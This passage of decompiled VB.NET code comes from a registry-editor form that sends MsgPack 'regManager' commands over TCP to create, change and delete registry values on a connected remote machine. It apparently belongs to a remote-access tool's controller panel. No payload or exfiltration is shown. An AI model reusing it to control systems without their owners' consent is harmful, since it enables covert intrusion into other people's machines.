				Me.lstRegistryValues.LabelEdit = False
			End If
		End Sub

		' Token: 0x06000803 RID: 2051 RVA: 0x00042A98 File Offset: 0x00040C98
		Private Sub LstRegistryValues_KeyUp(sender As Object, e As KeyEventArgs)
			Dim flag As Boolean = e.KeyCode = Keys.Delete AndAlso Me.GetDeleteState()
			If flag Then
				Me.DeleteToolStripMenuItem1_Click(Me, e)
			End If
		End Sub

		' Token: 0x06000804 RID: 2052 RVA: 0x00042AC6 File Offset: 0x00040CC6
		Private Sub LstRegistryValues_MouseClick(sender As Object, e As MouseEventArgs)
			Me.LstRegistryValues_MouseUp(Me, e)
		End Sub

		' Token: 0x06000805 RID: 2053 RVA: 0x00042AD4 File Offset: 0x00040CD4
		Private Sub LstRegistryValues_MouseUp(sender As Object, e As MouseEventArgs)
			Dim flag As Boolean = e.Button = MouseButtons.Right
			If flag Then
				Dim position As Point = New Point(e.X, e.Y)
				Dim flag2 As Boolean = Me.lstRegistryValues.GetItemAt(position.X, position.Y) Is Nothing
				If flag2 Then
					Me.lst_ContextMenuStrip.Show(Me.lstRegistryValues, position)
				Else
					Me.CreateListViewMenuStrip()
					Me.selectedItem_ContextMenuStrip.Show(Me.lstRegistryValues, position)
				End If
			End If
		End Sub

		' Token: 0x06000806 RID: 2054 RVA: 0x00042B5C File Offset: 0x00040D5C
		Private Sub CreateListViewMenuStrip()
			Dim modifyToolStripMenuItem As ToolStripMenuItem = Me.modifyToolStripMenuItem
			Dim modifyBinaryDataToolStripMenuItem As ToolStripMenuItem = Me.modifyBinaryDataToolStripMenuItem
			Dim toolStripMenuItem As ToolStripMenuItem = modifyBinaryDataToolStripMenuItem
			Dim enabled As Boolean = modifyBinaryDataToolStripMenuItem.Enabled
			Dim enabled2 As Boolean = FormRegistryE.Assign(Of Boolean)(enabled, Me.lstRegistryValues.SelectedItems.Count = 1)
			toolStripMenuItem.Enabled = enabled
			modifyToolStripMenuItem.Enabled = enabled2
			Me.renameToolStripMenuItem1.Enabled = (Me.lstRegistryValues.SelectedItems.Count = 1 AndAlso Not RegValueHelper.IsDefaultValue(Me.lstRegistryValues.SelectedItems(0).Name))
			Me.deleteToolStripMenuItem1.Enabled = (Me.tvRegistryDirectory.SelectedNode IsNot Nothing AndAlso Me.lstRegistryValues.SelectedItems.Count > 0)
		End Sub

		' Token: 0x06000807 RID: 2055 RVA: 0x00042C18 File Offset: 0x00040E18
		Public Shared Function Assign(Of T)(ByRef target As T, value As T) As T
			target = value
			Return value
		End Function

		' Token: 0x06000808 RID: 2056 RVA: 0x00042C34 File Offset: 0x00040E34
		Private Sub DeleteToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Dim text As String = "Deleting certain registry values could cause system instability. Are you sure you want to permanently delete " + If((Me.lstRegistryValues.SelectedItems.Count = 1), "this value?", "these values?")
			Dim caption As String = "Confirm Value Delete"
			Dim dialogResult As DialogResult = MessageBox.Show(text, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation)
			Dim flag As Boolean = dialogResult = DialogResult.Yes
			If flag Then
				Try
					For Each obj As Object In Me.lstRegistryValues.SelectedItems
						Dim objectValue As Object = RuntimeHelpers.GetObjectValue(obj)
						Dim flag2 As Boolean = objectValue.[GetType]() Is GetType(RegistryValueLstItem)
						If flag2 Then
							Dim registryValueLstItem As RegistryValueLstItem = CType(objectValue, RegistryValueLstItem)
							Dim msgPack As MsgPack = New MsgPack()
							msgPack.ForcePathObject("Packet").AsString = "regManager"
							msgPack.ForcePathObject("Command").AsString = "DeleteRegistryValue"
							msgPack.ForcePathObject("KeyPath").AsString = Me.tvRegistryDirectory.SelectedNode.FullPath
							msgPack.ForcePathObject("ValueName").AsString = registryValueLstItem.RegName
							ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
						End If
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
			End If
		End Sub

		' Token: 0x06000809 RID: 2057 RVA: 0x00042DA4 File Offset: 0x00040FA4
		Private Sub RenameToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Me.lstRegistryValues.LabelEdit = True
			Me.lstRegistryValues.SelectedItems(0).BeginEdit()
		End Sub

		' Token: 0x0600080A RID: 2058 RVA: 0x00042DCB File Offset: 0x00040FCB
		Private Sub ModifyBinaryDataToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Me.CreateEditForm(True)
		End Sub

		' Token: 0x0600080B RID: 2059 RVA: 0x00042DD8 File Offset: 0x00040FD8
		Private Sub CreateEditForm(isBinary As Boolean)
			Dim fullPath As String = Me.tvRegistryDirectory.SelectedNode.FullPath
			Dim name As String = Me.lstRegistryValues.SelectedItems(0).Name
			Dim regValueData As RegistrySeeker.RegValueData = CType(Me.tvRegistryDirectory.SelectedNode.Tag, RegistrySeeker.RegValueData()).ToList().Find(Function(item As RegistrySeeker.RegValueData) Operators.CompareString(item.Name, name, False) = 0)
			Dim valueKind As RegistryValueKind = If(isBinary, RegistryValueKind.Binary, regValueData.Kind)
			Using editForm As Form = Me.GetEditForm(regValueData, valueKind)
				Dim flag As Boolean = editForm.ShowDialog() = DialogResult.OK
				If flag Then
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").AsString = "regManager"
					msgPack.ForcePathObject("Command").AsString = "ChangeRegistryValue"
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				End If
			End Using
		End Sub

		' Token: 0x0600080C RID: 2060 RVA: 0x00042EE4 File Offset: 0x000410E4
		Private Function GetEditForm(value As RegistrySeeker.RegValueData, valueKind As RegistryValueKind) As Form
			Select Case valueKind
				Case RegistryValueKind.[String], RegistryValueKind.ExpandString
					Return New FormRegValueEditString(value)
				Case RegistryValueKind.Binary
					Return New FormRegValueEditBinary(value)
				Case RegistryValueKind.DWord, RegistryValueKind.QWord
					Return New FormRegValueEditWord(value)
				Case RegistryValueKind.MultiString
					Return New FormRegValueEditMultiString(value)
			End Select
			Return Nothing
		End Function

		' Token: 0x0600080D RID: 2061 RVA: 0x00042F59 File Offset: 0x00041159
		Private Sub ModifyToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Me.CreateEditForm(False)
		End Sub

		' Token: 0x0600080E RID: 2062 RVA: 0x00042F64 File Offset: 0x00041164
		Private Sub BinaryValueToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.tvRegistryDirectory.SelectedNode IsNot Nothing
			If flag Then
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "regManager"
				msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue"
				msgPack.ForcePathObject("KeyPath").AsString = Me.tvRegistryDirectory.SelectedNode.FullPath
				msgPack.ForcePathObject("Kindstring").AsString = "3"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			End If
		End Sub

		' Token: 0x0600080F RID: 2063 RVA: 0x00043010 File Offset: 0x00041210
		Private Sub DWORD32bitValueToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.tvRegistryDirectory.SelectedNode IsNot Nothing
			If flag Then
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "regManager"
				msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue"
				msgPack.ForcePathObject("KeyPath").AsString = Me.tvRegistryDirectory.SelectedNode.FullPath
				msgPack.ForcePathObject("Kindstring").AsString = "4"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			End If
		End Sub

		' Token: 0x06000810 RID: 2064 RVA: 0x000430BC File Offset: 0x000412BC
		Private Sub QWORD64bitValueToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.tvRegistryDirectory.SelectedNode IsNot Nothing
			If flag Then
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "regManager"
				msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue"
				msgPack.ForcePathObject("KeyPath").AsString = Me.tvRegistryDirectory.SelectedNode.FullPath
				msgPack.ForcePathObject("Kindstring").AsString = "11"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			End If
		End Sub

		' Token: 0x06000811 RID: 2065 RVA: 0x00043168 File Offset: 0x00041368
		Private Sub MultiStringValueToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.tvRegistryDirectory.SelectedNode IsNot Nothing
			If flag Then
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "regManager"
				msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue"
				msgPack.ForcePathObject("KeyPath").AsString = Me.tvRegistryDirectory.SelectedNode.FullPath
				msgPack.ForcePathObject("Kindstring").AsString = "7"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			End If
		End Sub

		' Token: 0x06000812 RID: 2066 RVA: 0x00043214 File Offset: 0x00041414
		Private Sub ExpandableStringValueToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.tvRegistryDirectory.SelectedNode IsNot Nothing
			If flag Then
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "regManager"
				msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue"
				msgPack.ForcePathObject("KeyPath").AsString = Me.tvRegistryDirectory.SelectedNode.FullPath
				msgPack.ForcePathObject("Kindstring").AsString = "2"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			End If
		End Sub

		' Token: 0x06000813 RID: 2067 RVA: 0x000432BF File Offset: 0x000414BF
		Private Sub KeyToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Me.KeyToolStripMenuItem_Click(Me, e)
		End Sub

		' Token: 0x06000814 RID: 2068 RVA: 0x000432CB File Offset: 0x000414CB
		Private Sub StringValueToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Me.StringValueToolStripMenuItem_Click(Me, e)
		End Sub

		' Token: 0x06000815 RID: 2069 RVA: 0x000432D7 File Offset: 0x000414D7
		Private Sub BinaryValueToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Me.BinaryValueToolStripMenuItem_Click(Me, e)
		End Sub

		' Token: 0x06000816 RID: 2070 RVA: 0x000432E3 File Offset: 0x000414E3
		Private Sub DWORD32bitValueToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Me.DWORD32bitValueToolStripMenuItem_Click(Me, e)
		End Sub

		' Token: 0x06000817 RID: 2071 RVA: 0x000432EF File Offset: 0x000414EF
		Private Sub QWORD64bitValueToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Me.QWORD64bitValueToolStripMenuItem_Click(Me, e)
		End Sub

		' Token: 0x06000818 RID: 2072 RVA: 0x000432FB File Offset: 0x000414FB
		Private Sub MultiStringValueToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Me.MultiStringValueToolStripMenuItem_Click(Me, e)
		End Sub

		' Token: 0x06000819 RID: 2073 RVA: 0x00043307 File Offset: 0x00041507
		Private Sub ExpandableStringValueToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Me.ExpandableStringValueToolStripMenuItem_Click(Me, e)
		End Sub

		' Token: 0x0600081A RID: 2074 RVA: 0x00043314 File Offset: 0x00041514
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Me.ParentClient.TcpClient.Connected OrElse Not Me.Client.TcpClient.Connected
				If flag Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
		End Sub

		' Token: 0x0600081B RID: 2075 RVA: 0x00043380 File Offset: 0x00041580
		Private Sub RefreshView()
			Try
				Me.tvRegistryDirectory.Nodes.Clear()
				Me.lstRegistryValues.Items.Clear()
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "Refresh"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600081C RID: 2076 RVA: 0x0004340C File Offset: 0x0004160C
		Private Sub RefreshToolStripMenuItem2_Click(sender As Object, e As EventArgs)
			Me.RefreshView()
		End Sub

		' Token: 0x0600081D RID: 2077 RVA: 0x00043416 File Offset: 0x00041616
		Private Sub RefreshToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Me.RefreshView()
		End Sub

		' Token: 0x0600081E RID: 2078 RVA: 0x00043420 File Offset: 0x00041620
		Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Me.RefreshView()
		End Sub

		' Token: 0x0600081F RID: 2079 RVA: 0x0004342A File Offset: 0x0004162A
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			ThreadPool.QueueUserWorkItem(Sub(o As Object)
				Dim client As Clients = Me.Client
				If client IsNot Nothing Then
					client.Disconnected()
				End If
				MyBase.Close()
			End Sub)
		End Sub

		' Token: 0x06000820 RID: 2080 RVA: 0x00043440 File Offset: 0x00041640
		Private Sub FormRegistryE_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x04000399 RID: 921
		Public FormSize As Boolean
	End Class
End Namespace
